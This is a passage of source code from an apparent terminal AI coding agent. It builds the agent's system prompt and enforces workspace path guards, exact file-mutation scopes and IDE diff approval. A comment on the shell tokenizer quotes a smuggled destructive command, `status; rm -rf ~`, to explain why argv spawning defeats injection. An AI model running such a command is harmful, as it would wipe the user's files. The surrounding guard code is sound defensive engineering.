      runEnvironmentProbe(py.command, ["-m", "pip", "--version"], {
        encoding: "utf-8",
        timeout: 10000,
        stdio: ["pipe", "pipe", "pipe"],
      });
      pipAvailable = true;
    } catch {
      // pip not available
    }
  }

  let nodeVersion = null;
  try {
    nodeVersion = runEnvironmentProbe(process.execPath, ["--version"], {
      encoding: "utf-8",
      timeout: 5000,
    }).trim();
  } catch {
    // Node not available (unlikely since we're running in Node)
  }

  let gitAvailable = false;
  try {
    runEnvironmentProbe("git", ["--version"], {
      encoding: "utf-8",
      timeout: 5000,
      stdio: ["pipe", "pipe", "pipe"],
    });
    gitAvailable = true;
  } catch {
    // git not available
  }

  _cachedEnvInfo = {
    os: process.platform,
    arch: process.arch,
    python: py.found ? `${py.command} (${py.version})` : null,
    pip: pipAvailable,
    node: nodeVersion,
    git: gitAvailable,
  };
  return _cachedEnvInfo;
}

// ─── System prompt ────────────────────────────────────────────────────────

export function getBaseSystemPrompt(cwd) {
  const env = getEnvironmentInfo();
  const envLines = [
    `OS: ${env.os} (${env.arch})`,
    env.python
      ? `Python: ${env.python}${env.pip ? " + pip" : ""}`
      : "Python: not found",
    env.node ? `Node.js: ${env.node}` : "Node.js: not found",
    `Git: ${env.git ? "available" : "not found"}`,
  ];

  return `You are ChainlessChain AI Assistant, a powerful agentic coding assistant running in the terminal.

You have access to tools that let you read files, write files, edit files, run shell commands, and search the codebase. When the user asks you to do something, USE THE TOOLS to actually do it — don't just describe what should be done.

Key behaviors:
- When asked to modify code, read the file first, then edit it
- When asked to create something, use write_file to create it
- When asked to remove or rename a file, use delete_file or move_file so the filesystem intent is explicit and reviewable
- When asked to run/test something, use run_shell to execute it
- For long-running commands (builds, full test suites, dev servers) set run_shell { run_in_background: true } to get a task_id back immediately, then poll output and completion with check_shell { task_id }. Kill a backgrounded server with check_shell { task_id, kill: true } when finished
- When asked about git status, diff, log, or other repository operations, use the git tool instead of run_shell
- When asked about files or code, use read_file and search_files to find information
- Before renaming or changing a symbol, use code_intelligence (action: references/definition) to find every real usage instead of guessing with text search. It degrades to "unavailable" when no language server is installed — fall back to search_files then.
- After an edit, if the tool result includes a "newDiagnostics" array, you just introduced (or exposed) those errors/warnings — read them and fix before moving on. You can also run code_intelligence (action: diagnostics) on any file to check it on demand.
- If a tool result includes a "subtreeInstructions" array, you just entered a subdirectory that carries its own cc.md/CLAUDE.md/AGENTS.md — treat that content as authoritative project rules for work in that subtree (it is injected once, the first time you touch the subtree).
- You have multi-layer skills (built-in, marketplace, global, project-level) — use list_skills to discover them and run_skill to execute them
- Always explain what you're doing and show results
- Be concise but thorough

When the user's problem involves data processing, calculations, file operations, text parsing, API calls, web scraping, or any task that can be solved programmatically:
- Proactively write and execute code using run_code tool
- Choose the best language: Python for data/math/scraping, Node.js for JSON/API, Bash for system tasks
- Missing Python packages are NOT auto-installed by default; the tool result tells you (and the user) how to opt in (settings runCode.autoInstall)
- Scripts run from a temp file by default; pass persist:true to keep one in .chainlesschain/agent-scripts/ for reference
- Show the results and explain them clearly
- If the first attempt fails, debug and retry with a different approach

You are not just a chatbot — you are a capable coding agent. Think step by step, write code when needed, and deliver real results.

## Sub-Agent Isolation
When a task involves multiple distinct roles (e.g. code review + code generation), or when you need
focused analysis without polluting your current context, use the spawn_sub_agent tool. Examples:
- Code review as a separate perspective while you're implementing
- Summarizing a large file before incorporating it into your response
- Running a focused analysis (security, performance) on specific code
- Translating or reformatting content independently
The sub-agent has its own message history and only returns a summary — your context stays clean.
Do NOT spawn sub-agents for trivial tasks that you can handle directly.

## Environment
${envLines.join("\n")}

Current working directory: ${cwd || process.cwd()}`;
}

// ─── Persona support ─────────────────────────────────────────────────────

/**
 * Load persona configuration from project config.json.
 *
 * Resolution order (highest priority first):
 *   1. CC_PACK_AUTO_PERSONA env var → config.personas[<env>] if present
 *      (set by `cc pack --project` packed exe at boot, per Phase 3f; the
 *      Phase 3d resolver lives here so packaged products actually activate
 *      their bundled persona at runtime)
 *   2. config.activePersonaName → config.personas[<name>] if present
 *      (set by `cc persona activate <name>`)
 *   3. config.persona (the legacy inline single-persona shape; still the
 *      common case for projects created via `cc init`)
 *
 * @param {string} cwd - working directory
 * @returns {object|null} persona object or null
 */
function _loadProjectPersona(cwd) {
  try {
    const projectRoot = findProjectRoot(cwd || process.cwd());
    if (!projectRoot) return null;
    const config = loadProjectConfig(projectRoot);
    if (!config) return null;
    const personas =
      config.personas && typeof config.personas === "object"
        ? config.personas
        : null;
    const envName = process.env.CC_PACK_AUTO_PERSONA;
    if (envName && personas && personas[envName]) {
      return personas[envName];
    }
    const activeName = config.activePersonaName;
    if (activeName && personas && personas[activeName]) {
      return personas[activeName];
    }
    return config.persona || null;
  } catch {
    return null;
  }
}

/**
 * Build a persona-specific system prompt
 * @param {object} persona - persona configuration
 * @param {string[]} envLines - environment info lines
 * @param {string} cwd - working directory
 * @returns {string}
 */
function _buildPersonaPrompt(persona, envLines, cwd) {
  const lines = [];
  lines.push(`You are ${persona.name || "AI Assistant"}.`);
  if (persona.role) {
    lines.push("");
    lines.push(persona.role);
  }
  if (persona.behaviors?.length > 0) {
    lines.push("");
    lines.push("Key behaviors:");
    for (const b of persona.behaviors) {
      lines.push(`- ${b}`);
    }
  }
  lines.push("");
  lines.push(
    "You have access to tools that let you read files, write files, edit files, run shell commands, and search the codebase. When the user asks you to do something, USE THE TOOLS to actually do it.",
  );
  if (persona.toolsPriority?.length > 0) {
    lines.push(`\nPreferred tools: ${persona.toolsPriority.join(", ")}`);
  }
  lines.push(`\n## Environment\n${envLines.join("\n")}`);
  lines.push(`\nCurrent working directory: ${cwd || process.cwd()}`);
  return lines.join("\n");
}

/**
 * Build the full system prompt with persona, rules.md, and auto-activated persona skills.
 * Single entry point used by both agent-repl and ws-session-manager.
 *
 * Priority order:
 *  1. config.json persona → replaces base system prompt
 *  2. Auto-activated persona skills → appended
 *  3. rules.md → appended
 *  4. Default hardcoded prompt → fallback when no persona
 *
 * @param {string} [cwd] - working directory
 * @param {object} [opts]
 * @param {string[]} [opts.additionalDirectories] - extra workspace roots
 *   (absolute paths) the agent may read/search/edit beyond `cwd`.
 * @returns {string} complete system prompt
 */
export function buildSystemPrompt(cwd, opts = {}) {
  const dir = cwd || process.cwd();

  // Check for project persona
  const persona = _loadProjectPersona(dir);
  let prompt;
  if (persona) {
    const env = getEnvironmentInfo();
    const envLines = [
      `OS: ${env.os} (${env.arch})`,
      env.python
        ? `Python: ${env.python}${env.pip ? " + pip" : ""}`
        : "Python: not found",
      env.node ? `Node.js: ${env.node}` : "Node.js: not found",
      `Git: ${env.git ? "available" : "not found"}`,
    ];
    prompt = _buildPersonaPrompt(persona, envLines, dir);
  } else {
    prompt = getBaseSystemPrompt(dir);
  }

  // Append auto-activated persona skills
  try {
    const loader = opts.skillLoader || new CLISkillLoader();
    const personaSkills = loader.getAutoActivatedPersonas({
      sessionId: opts.sessionId,
      turnId: opts.turnId,
      loadedBecause: "persona_auto",
    });
    // Re-admit custom/injected loader output at the final model boundary. Do
    // the complete aggregate pass before appending anything so an oversized
    // later persona cannot leave an earlier partial projection in the prompt.
    const limits = resolveSkillLimits(loader.getLimits?.());
    const promptBudget = { limits, bytes: 0, tokens: 0 };
    const personaProjections = [];
    for (const personaSkill of personaSkills) {
      const displayName =
        typeof personaSkill?.displayName === "string"
          ? personaSkill.displayName
          : typeof personaSkill?.id === "string"
            ? personaSkill.id
            : "Skill";
      const body = personaSkill?.body;
      admitSkillPrompt(body, limits);
      if (!body.trim()) continue;
      const projection = `\n\n## Persona: ${displayName}\n${body}`;
      debitSkillPromptBudget(
        promptBudget,
        admitSkillPrompt(projection, limits),
      );
      personaProjections.push(projection);
    }
    if (typeof opts.onSkillsLoaded === "function") {
      opts.onSkillsLoaded(personaSkills, loader.getCacheLedger());
    }
    for (const projection of personaProjections) {
      prompt += projection;
    }
  } catch {
    // Non-critical — skill loader may not be available
  }

  // Append rules.md — unless the caller opted into a lean/off prompt. `rules.md`
  // is coding-convention DETAIL (the entry cc.md/CLAUDE.md references it), so it
  // is shed both when project memory is fully off (`--no-project-memory` →
  // projectMemory === false) AND in entry-only lean mode (projectMemory ===
  // "lean", or the env signal CC_PROJECT_MEMORY=lean when no explicit value is
  // threaded). NOTE: legacy `CC_PROJECT_MEMORY=0` intentionally still KEEPS
  // rules.md (its long-standing contract only dropped the instruction block) —
  // so we only honor the "lean" env here, never "0".
  const _pm = opts.projectMemory;
  const _envLean =
    process.env.CC_PROJECT_MEMORY === "lean" ||
    process.env.CC_PROJECT_MEMORY === "entry";
  const _dropRules =
    _pm === false ||
    _pm === "lean" ||
    _pm === "entry" ||
    (_pm == null && _envLean);
  if (!_dropRules) {
    try {
      const projectRoot = findProjectRoot(dir);
      if (projectRoot) {
        const rulesPath = path.join(projectRoot, ".chainlesschain", "rules.md");
        if (fs.existsSync(rulesPath)) {
          const content = fs.readFileSync(rulesPath, "utf-8");
          if (content.trim()) {
            prompt += `\n\n## Project Rules\n${content}`;
          }
        }
      }
    } catch {
      // Non-critical
    }
  }

  // Advertise extra workspace roots (--add-dir) so the model knows it may
  // reach beyond cwd and which absolute paths to use.
  const extraDirs = Array.isArray(opts.additionalDirectories)
    ? opts.additionalDirectories.filter(Boolean)
    : [];
  if (extraDirs.length > 0) {
    prompt +=
      `\n\n## Additional working directories\n` +
      `Beyond the current working directory, you may read, search, and edit ` +
      `files under these absolute roots. Pass absolute paths to access them:\n` +
      extraDirs.map((d) => `- ${d}`).join("\n");
  }

  // Advertise user-defined slash commands (.claude/commands/*.md etc.) so the
  // model knows which prompt macros it can run via the slash_command tool.
  try {
    const macros = discoverCommands(dir);
    if (macros.length > 0) {
      prompt +=
        `\n\n## Available slash commands\n` +
        `These are reusable prompt macros the user has defined. Run one with ` +
        `the slash_command tool (e.g. {"command":"/${macros[0].name}"}) when it ` +
        `fits the task; the tool returns the command's expanded instructions ` +
        `for you to carry out.\n` +
        macros
          .map(
            (m) =>
              `- /${m.name}` +
              (m.argumentHint ? ` ${m.argumentHint}` : "") +
              (m.description ? ` — ${m.description}` : ""),
          )
          .join("\n");
    }
  } catch {
    // Non-critical — command discovery failure must not break the prompt.
  }

  return prompt;
}

// ─── Tool execution ──────────────────────────────────────────────────────

/** The file-mutating tools whose `ask` can be reviewed as an IDE diff. */
const IDE_DIFF_EDIT_TOOLS = new Set([
  "write_file",
  "edit_file",
  "edit_file_hashed",
  "delete_file",
  "move_file",
]);
const GUARDED_FILE_MUTATION_TOOLS = new Set([
  ...IDE_DIFF_EDIT_TOOLS,
  "notebook_edit",
]);
const EXACT_FILE_MUTATION_SCOPE_TOOL_NAMES = new Set([
  "read_file",
  "search_files",
  "list_dir",
  "write_file",
  "edit_file",
  "edit_file_hashed",
]);
const EXACT_FILE_MUTATION_OPENED_STATE_FIELDS = Object.freeze([
  "mode",
  "nlink",
  "size",
  "mtimeNs",
  "ctimeNs",
]);
const EXACT_FILE_MUTATION_RENAME_STABLE_STATE_FIELDS = Object.freeze([
  "mode",
  "nlink",
  "size",
  "mtimeNs",
]);
const NORMALIZED_EXACT_FILE_MUTATION_SCOPES = new WeakSet();
const EXACT_FILE_MUTATION_SCOPE_STATES = new WeakMap();
const WINDOWS_RESERVED_PATH_SEGMENT =
  /^(?:con|prn|aux|nul|com[1-9]|lpt[1-9])(?:\..*)?$/iu;

function sameCanonicalPath(left, right) {
  return (
    typeof left === "string" &&
    typeof right === "string" &&
    path.relative(left, right) === "" &&
    path.relative(right, left) === ""
  );
}

function exactRepoRelativeFilePath(value) {
  const segments = typeof value === "string" ? value.split("/") : [];
  if (
    typeof value !== "string" ||
    value.length === 0 ||
    value.includes("\0") ||
    value.includes("\\") ||
    path.posix.isAbsolute(value) ||
    /^[A-Za-z]:/u.test(value) ||
    path.posix.normalize(value) !== value ||
    value === "." ||
    value === ".." ||
    value.startsWith("../") ||
    segments.some(
      (segment) =>
        segment === "" ||
        segment === "." ||
        segment === ".." ||
        /[<>:"|?*]/u.test(segment) ||
        [...segment].some((character) => character.charCodeAt(0) <= 0x1f) ||
        /[ .]$/u.test(segment) ||
        WINDOWS_RESERVED_PATH_SEGMENT.test(segment),
    )
  ) {
    throw new Error(
      "path must be one portable canonical repo-relative file path",
    );
  }
  return value;
}

function canonicalRealpath(candidate) {
  const realpath = fs.realpathSync.native || fs.realpathSync;
  return path.resolve(realpath(candidate));
}

function filesystemIdentity(stats) {
  const mtimeNs =
    stats.mtimeNs != null
      ? String(stats.mtimeNs)
      : String(Math.trunc(Number(stats.mtimeMs) * 1_000_000));
  return Object.freeze({
    dev: String(stats.dev),
    ino: String(stats.ino),
    type: stats.isFile() ? "file" : stats.isDirectory() ? "directory" : "other",
    nlink: String(stats.nlink),
    size: String(stats.size),
    mtimeNs,
  });
}

function sameFilesystemObjectIdentity(left, right) {
  return Boolean(
    left &&
    right &&
    left.dev === right.dev &&
    left.ino === right.ino &&
    left.type === right.type,
  );
}

function sameFilesystemIdentity(left, right, { content = false } = {}) {
  return Boolean(
    sameFilesystemObjectIdentity(left, right) &&
    left.nlink === right.nlink &&
    (!content || (left.size === right.size && left.mtimeNs === right.mtimeNs)),
  );
}

function lstatIdentity(candidate) {
  const stats = fs.lstatSync(candidate, { bigint: true });
  if (stats.isSymbolicLink()) {
    throw new Error(`filesystem alias is not allowed: ${candidate}`);
  }
  return { stats, identity: filesystemIdentity(stats) };
}

function exactBindingState(canonicalRoot, relativePath, absolutePath) {
  const ancestors = [];
  let current = canonicalRoot;
  const root = lstatIdentity(current);
  if (!root.stats.isDirectory()) {
    throw new Error("mutation scope worktree root must be a directory");
  }
  ancestors.push(Object.freeze({ path: current, identity: root.identity }));
  const segments = relativePath.split("/");
  for (const segment of segments.slice(0, -1)) {
    current = path.join(current, segment);
    const ancestor = lstatIdentity(current);
    if (!ancestor.stats.isDirectory()) {
      throw new Error(`mutation scope parent is not a directory: ${current}`);
    }
    ancestors.push(
      Object.freeze({ path: current, identity: ancestor.identity }),
    );
  }
  const target = lstatIdentity(absolutePath);
  if (!target.stats.isFile()) {
    throw new Error(
      `mutation scope target must be an existing regular file: ${relativePath}`,
    );
  }
  if (target.stats.nlink !== 1n) {
    throw new Error(
      `mutation scope target must not have hard links: ${relativePath}`,
    );
  }
  return {
    ancestors: Object.freeze(ancestors),
    fileIdentity: target.identity,
  };
}

function verifyExactScopeAncestors(state) {
  for (const ancestor of state.ancestors) {
    const current = lstatIdentity(ancestor.path);
    // Directory link counts are not portable identity fields. APFS counts all
    // directory entries, so creating our own staging file legitimately changes
    // nlink. Device + inode + directory type still fail closed on replacement.
    if (
      !current.stats.isDirectory() ||
      !sameFilesystemObjectIdentity(current.identity, ancestor.identity)
    ) {
      throw new Error(
        `mutation scope ancestor changed identity: ${ancestor.path}`,
      );
    }
  }
}

function verifyExactBindingState(scope, binding) {
  const state = EXACT_FILE_MUTATION_SCOPE_STATES.get(scope)?.get(
    binding.relativePath,
  );
  if (!state) {
    throw new Error("mutation scope identity state is unavailable");
  }
  verifyExactScopeAncestors(state);
  const current = lstatIdentity(binding.absolutePath);
  if (
    !current.stats.isFile() ||
    current.stats.nlink !== 1n ||
    !sameFilesystemIdentity(current.identity, state.fileIdentity, {
      content: true,
    })
  ) {
    throw new Error(
      `mutation scope file changed identity or content: ${binding.relativePath}`,
    );
  }
  return state;
}

/**
 * Bind an exact mutation scope to one canonical worktree and a fixed set of
 * repo-relative file identities. This is intentionally stricter than the
 * general workspace guard: aliases through symlinks/junctions are rejected,
 * even when they resolve to another location inside the same worktree.
 */
export function normalizeExactFileMutationScope(
  scope,
  { cwd = process.cwd() } = {},
) {
  if (scope == null) return null;
  if (NORMALIZED_EXACT_FILE_MUTATION_SCOPES.has(scope)) {
    const canonicalCwd = canonicalRealpath(cwd);
    if (!sameCanonicalPath(canonicalCwd, scope.worktreeRoot)) {
      throw new Error("mutation scope worktree does not match the run cwd");
    }
    return scope;
  }
  if (
    !scope ||
    typeof scope !== "object" ||
    Array.isArray(scope) ||
    scope.exact !== true
  ) {
    throw new Error("mutation scope must be an exact object");
  }
  if (
    typeof scope.worktreeRoot !== "string" ||
    scope.worktreeRoot.length === 0 ||
    scope.worktreeRoot.includes("\0") ||
    !path.isAbsolute(scope.worktreeRoot) ||
    path.normalize(scope.worktreeRoot) !== scope.worktreeRoot
  ) {
    throw new Error(
      "mutation scope worktree root must be canonical and absolute",
    );
  }
  const canonicalRoot = canonicalRealpath(scope.worktreeRoot);
  if (!sameCanonicalPath(canonicalRoot, scope.worktreeRoot)) {
    throw new Error("mutation scope worktree root must be its real path");
  }
  if (!fs.statSync(canonicalRoot).isDirectory()) {
    throw new Error("mutation scope worktree root must be a directory");
  }
  const canonicalCwd = canonicalRealpath(cwd);
  if (!sameCanonicalPath(canonicalCwd, canonicalRoot)) {
    throw new Error("mutation scope worktree does not match the run cwd");
  }
  if (!Array.isArray(scope.allowedPaths) || scope.allowedPaths.length === 0) {
    throw new Error("mutation scope requires at least one allowed path");
  }

  const allowedPaths = scope.allowedPaths.map(exactRepoRelativeFilePath);
  if (new Set(allowedPaths).size !== allowedPaths.length) {
    throw new Error("mutation scope allowed paths must be unique");
  }
  const bindings = allowedPaths.map((relativePath) => {
    const absolutePath = path.resolve(
      canonicalRoot,
      ...relativePath.split("/"),
    );
    const verdict = resolveSandboxPolicyPath(relativePath, {
      access: "write",
      cwd: canonicalRoot,
      workspaceRoots: [canonicalRoot],
      sandbox: null,
    });
    if (!verdict.ok) {
      throw new Error(
        `mutation scope path "${relativePath}" is unsafe: ${verdict.error}`,
      );
    }
    if (
      !sameCanonicalPath(verdict.path, absolutePath) ||
      !sameCanonicalPath(verdict.canonicalPath, absolutePath)
    ) {
      throw new Error(
        `mutation scope path "${relativePath}" traverses a filesystem alias`,
      );
    }
    if (!fs.existsSync(absolutePath)) {
      throw new Error(
        `mutation scope target must already exist: ${relativePath}`,
      );
    }
    return Object.freeze({
      relativePath,
      absolutePath,
      canonicalPath: verdict.canonicalPath,
    });
  });
  const normalized = Object.freeze({
    exact: true,
    worktreeRoot: canonicalRoot,
    allowedPaths: Object.freeze([...allowedPaths]),
    bindings: Object.freeze(bindings),
  });
  NORMALIZED_EXACT_FILE_MUTATION_SCOPES.add(normalized);
  EXACT_FILE_MUTATION_SCOPE_STATES.set(
    normalized,
    new Map(
      bindings.map((binding) => [
        binding.relativePath,
        exactBindingState(
          canonicalRoot,
          binding.relativePath,
          binding.absolutePath,
        ),
      ]),
    ),
  );
  return normalized;
}

function agentFileToolPathRequests(name, args = {}, workspaceRoots = []) {
  const one = (argument, access) =>
    typeof args[argument] === "string" && args[argument].length > 0
      ? [{ argument, path: args[argument], access }]
      : [];
  switch (name) {
    case "read_file":
      return one("path", "read");
    case "write_file":
    case "edit_file":
    case "edit_file_hashed":
    case "delete_file":
    case "notebook_edit":
      return one("path", "write");
    case "move_file":
      return [...one("path", "write"), ...one("target_path", "write")];
    case "list_dir":
      return [
        {
          argument: "path",
          path:
            typeof args.path === "string" && args.path.length > 0
              ? args.path
              : ".",
          access: "read",
        },
      ];
    case "search_files":
      return typeof args.directory === "string" && args.directory.length > 0
        ? [
            {
              argument: "directory",
              path: args.directory,
              access: "read",
            },
          ]
        : workspaceRoots.map((root) => ({
            argument: "directory",
            path: root,
            access: "read",
          }));
    case "code_intelligence":
      return args.action === "workspace_symbols"
        ? workspaceRoots.map((root) => ({
            argument: "file",
            path: root,
            access: "read",
          }))
        : one("file", "read");
    case "publish_artifact":
      return one("path", "read");
    default:
      return [];
  }
}

function guardAgentFileToolPaths(name, args, context, cwd) {
  const workspaceRoots = workspaceRootsFor(cwd, context.additionalDirectories);
  const requests = agentFileToolPathRequests(name, args || {}, workspaceRoots);
  for (const request of requests) {
    const verdict = resolveSandboxPolicyPath(request.path, {
      access: request.access,
      cwd,
      workspaceRoots,
      sandbox: context.sandbox || null,
    });
    if (!verdict.ok) {
      return {
        error:
          `[Workspace Path Guard] ${name}.${request.argument} ` +
          `"${request.path}" was blocked: ${verdict.error}.`,
        policy: {
          decision: "deny",
          via: "workspace-path-guard",
          reason: verdict.reason,
          access: request.access,
        },
      };
    }
  }
  return null;
}

function fileMutationPaths(name, args = {}) {
  return [
    args.path,
    ...(name === "move_file" ? [args.target_path] : []),
  ].filter(Boolean);
}

function guardExactFileMutationScope(name, args, context, cwd) {
  if (context.fileMutationScope == null) {
    return null;
  }

  if (!EXACT_FILE_MUTATION_SCOPE_TOOL_NAMES.has(name)) {
    return {
      error: `[File Mutation Scope] Tool "${name}" is outside the hermetic file-tool ceiling.`,
      policy: {
        decision: "deny",
        via: "exact-file-mutation-scope",
        reason: "tool-not-allowed",
      },
    };
  }
  if (!GUARDED_FILE_MUTATION_TOOLS.has(name)) return null;

  let scope;
  try {
    scope = normalizeExactFileMutationScope(context.fileMutationScope, { cwd });
  } catch (error) {
    return {
      error: `[File Mutation Scope] Invalid exact scope: ${error.message}.`,
      policy: {
        decision: "deny",
        via: "exact-file-mutation-scope",
        reason: "invalid-scope",
      },
    };
  }

  const requestedPaths = fileMutationPaths(name, args);
  if (requestedPaths.length === 0) {
    return {
      error: `[File Mutation Scope] ${name} did not provide a mutation path.`,
      policy: {
        decision: "deny",
        via: "exact-file-mutation-scope",
        reason: "invalid-path",
      },
    };
  }

  for (const requestedPath of requestedPaths) {
    let relativePath;
    try {
      relativePath = exactRepoRelativeFilePath(requestedPath);
    } catch (error) {
      return {
        error:
          `[File Mutation Scope] ${name} path "${requestedPath}" was blocked: ` +
          `${error.message}.`,
        policy: {
          decision: "deny",
          via: "exact-file-mutation-scope",
          reason: "non-canonical-path",
        },
      };
    }
    const binding = scope.bindings.find(
      (candidate) => candidate.relativePath === relativePath,
    );
    if (!binding) {
      return {
        error: `[File Mutation Scope] ${name} path "${requestedPath}" is not in the exact allowed file set.`,
        policy: {
          decision: "deny",
          via: "exact-file-mutation-scope",
          reason: "path-not-allowed",
        },
      };
    }
    const verdict = resolveSandboxPolicyPath(relativePath, {
      access: "write",
      cwd: scope.worktreeRoot,
      workspaceRoots: [scope.worktreeRoot],
      sandbox: null,
    });
    if (
      !verdict.ok ||
      !sameCanonicalPath(verdict.path, binding.absolutePath) ||
      !sameCanonicalPath(verdict.canonicalPath, binding.canonicalPath) ||
      !sameCanonicalPath(verdict.canonicalPath, binding.absolutePath)
    ) {
      return {
        error: `[File Mutation Scope] ${name} path "${requestedPath}" changed physical identity or escaped its exact binding.`,
        policy: {
          decision: "deny",
          via: "exact-file-mutation-scope",
          reason: verdict.ok ? "path-identity-changed" : verdict.reason,
        },
      };
    }
    try {
      verifyExactBindingState(scope, binding);
    } catch (error) {
      return {
        error: `[File Mutation Scope] ${name} path "${requestedPath}" was blocked: ${error.message}.`,
        policy: {
          decision: "deny",
          via: "exact-file-mutation-scope",
          reason: "path-identity-changed",
        },
      };
    }
  }
  return null;
}

export function preflightToolExecutionAuthority(name, args, context = {}) {
  const cwd = context.cwd || process.cwd();
  if (
    Array.isArray(context.effectiveAllowedToolNames) &&
    !context.effectiveAllowedToolNames.includes(name)
  ) {
    return {
      error: `[Tool Capability] Tool "${name}" is outside this run's effective tool set.`,
      policy: { decision: "blocked", via: "effective-tool-set" },
    };
  }
  return guardExactFileMutationScope(name, args, context, cwd);
}

/**
 * Quote-aware shell tokenizer (mirrors gateways/ws `tokenizeCommand`). The `git`
 * tool runs the model-supplied command via argv (spawnSync, NO shell), so a
 * string like `status; rm -rf ~` can't inject a second command through the
 * shell — git just sees `status;` as an unknown subcommand. A quoted arg (e.g.
 * a commit message) keeps its content because quotes are consumed here.
 */
export function tokenizeShellWords(input) {
  const args = [];
  let current = "";
  let inDouble = false;
  let inSingle = false;
  let escape = false;
  for (const ch of String(input || "")) {
    if (escape) {
      current += ch;
      escape = false;
      continue;
    }
    if (ch === "\\" && inDouble) {
      escape = true;
      continue;
    }
    if (ch === '"' && !inSingle) {
      inDouble = !inDouble;
      continue;
    }
    if (ch === "'" && !inDouble) {
      inSingle = !inSingle;
      continue;
    }
    if ((ch === " " || ch === "\t") && !inDouble && !inSingle) {
      if (current.length > 0) {
        args.push(current);
        current = "";
      }
      continue;
    }
    current += ch;
  }
  if (current.length > 0) args.push(current);
  return args;
}

/**
 * Literal string edit shared by the edit_file preview + execution paths.
 * Uses split/join so `old_string` and `new_string` are treated as LITERAL text
 * (no regex / `$&` / `$1` pattern interpretation — a plain `String.replace`
 * with a string pattern still expands `$` sequences in the replacement).
 * Returns the occurrence count so the caller can require a UNIQUE match
 * (Claude-Code Edit parity): replacing the first of several identical strings
 * silently edits the wrong place.
 *
 * @returns {{ count:number, newContent:string }}
 */
function applyLiteralEdit(content, oldStr, newStr, replaceAll) {
  const parts = content.split(oldStr);
  const count = parts.length - 1;
  if (count === 0) return { count: 0, newContent: content };
  const newContent = replaceAll
    ? parts.join(newStr)
    : parts[0] + newStr + parts.slice(1).join(oldStr); // first occurrence only
  return { count, newContent };
}

/**
 * Compute the content an edit tool WOULD write, without writing it — the
 * left/right sides for an IDE diff review. Mirrors the corresponding
 * executeToolInner cases exactly (write/edit/delete/move; hashed edits use the
 * same pure replaceByHash). Returns an explicit operation plus the left/right
 * text and optional rename destination, or null when the proposal cannot be
 * computed — the caller then falls back to normal confirmation so the tool can
 * produce its own diagnostics.
 */
export function computeProposedEdit(name, args = {}, cwd = process.cwd()) {
  try {
    if (!args.path) return null;
    const filePath = path.resolve(cwd, args.path);
    if (name === "write_file") {
      if (typeof args.content !== "string") return null;
      const exists = fs.existsSync(filePath);
      const originalText = exists ? fs.readFileSync(filePath, "utf8") : "";
      return {
        filePath,
        newContent: args.content,
        originalText,
        operation: exists ? "modify" : "create",
      };
    }
    if (name === "delete_file") {
      if (!fs.existsSync(filePath) || fs.statSync(filePath).isDirectory()) {
        return null;
      }
      const originalText = fs.readFileSync(filePath, "utf8");
      return {
        filePath,
        newContent: "",
        originalText,
        operation: "delete",
      };
    }
    if (name === "move_file") {
      if (
        !args.target_path ||
        !fs.existsSync(filePath) ||
        fs.statSync(filePath).isDirectory()
      ) {
        return null;
      }
      const targetPath = path.resolve(cwd, args.target_path);
      if (targetPath === filePath || fs.existsSync(targetPath)) return null;
      const targetDir = path.dirname(targetPath);
      if (!fs.existsSync(targetDir) || !fs.statSync(targetDir).isDirectory()) {
        return null;
      }
      const originalText = fs.readFileSync(filePath, "utf8");
      return {
        filePath,
        targetPath,
        newContent: originalText,
        originalText,
        operation: "rename",
      };
    }
    if (name === "edit_file") {
      if (!fs.existsSync(filePath)) return null;
      const content = fs.readFileSync(filePath, "utf8");
      if (
        typeof args.old_string !== "string" ||
        args.old_string === "" ||
        typeof args.new_string !== "string"
      ) {
        return null;
      }
      const replaceAll = args.replace_all === true;
      const { count, newContent } = applyLiteralEdit(
        content,
        args.old_string,
        args.new_string,
        replaceAll,
      );
      // No match, or a non-unique match without replace_all → the edit will be
      // rejected, so show no (misleading) diff and let the tool report it.
      if (count === 0 || (count > 1 && !replaceAll)) return null;
      return {
        filePath,
        newContent,
        originalText: content,
        operation: "modify",
      };
    }
    if (name === "edit_file_hashed") {
      if (!fs.existsSync(filePath)) return null;
      if (!args.anchor_hash || typeof args.new_line !== "string") return null;
      const original = fs.readFileSync(filePath, "utf8");
      const result = replaceByHash(original, {
        anchorHash: args.anchor_hash,
        expectedLine: args.expected_line,
        newLine: args.new_line,
      });
      if (!result.success) return null;
      return {
        filePath,
        newContent: result.content,
        originalText: original,
        operation: "modify",
      };
    }
  } catch {
    // unreadable file etc. → no proposal, normal path handles it
  }
  return null;
}

/**
 * Shared IDE-diff approval routing for an `ask` decision about a file edit
 * (used by BOTH the settings-rules ask and the PreToolUse-hook ask). Returns
 *   { outcome:"accepted", result }  — the IDE wrote the file; the caller MUST
 *                                     return `result` and skip execution
 *   { outcome:"rejected", result }  — deny with `result`, file untouched
 *   null                            — not applicable (non-edit tool, headless,
 *                                     no IDE, disabled, no proposal, IDE died)
 *                                     → caller falls back to its own confirm.
 */
async function tryIdeDiffApprovalForEdit(
  name,
  args,
  context,
  cwd,
  { rule, source } = {},
) {
  if (!IDE_DIFF_EDIT_TOOLS.has(name)) return null;
  if (typeof context.permissionConfirm !== "function") return null; // interactive only
  const hostMcpClient = context.mcpHostClient || context.mcpClient;
  if (!hostMcpClient || !context.externalToolExecutors) return null;
  try {
    const {
      ideDiffApprovalEnabled,
      hasIdeOpenDiff,
      requestIdeDiffApproval,
      formatReviewComments,
      summarizeUserAmendments,
    } = await import("../lib/ide-context.js");
    const mcpLike = {
      mcpClient: hostMcpClient,
      externalToolExecutors: context.externalToolExecutors,
    };
    if (!ideDiffApprovalEnabled() || !hasIdeOpenDiff(mcpLike)) return null;
    const proposal = computeProposedEdit(name, args, cwd);
    if (!proposal) return null;
    const verdict = await requestIdeDiffApproval(mcpLike, {
      path: proposal.filePath,
      modifiedText: proposal.newContent,
      originalText: proposal.originalText,
      title: `cc agent: ${name} ${path.basename(proposal.filePath)}`,
      operation: proposal.operation,
      targetPath: proposal.targetPath,
      sessionId: context.sessionId || null,
      turnId: context.turnId || null,
      toolUseId: context.toolCallId || null,
    });
    if (verdict?.outcome === "accepted") {
      // When the reviewer amended the proposal in the diff before accepting,
      // hand the agent the actual -/+ delta — not just a flag — so its model
      // of the file matches what was really written (gap #4: the agent
      // perceives the user's edits).
      const amendments =
        verdict.finalText != null && verdict.finalText !== proposal.newContent
          ? summarizeUserAmendments(proposal.newContent, verdict.finalText)
          : null;
      return {
        outcome: "accepted",
        result: attachDiffReviewAudit(
          {
            success: true,
            path: proposal.filePath,
            operation: proposal.operation,
            ...(proposal.targetPath ? { targetPath: proposal.targetPath } : {}),
            appliedVia: "ide-diff",
            ...(amendments
              ? { userEdited: true, userAmendments: amendments }
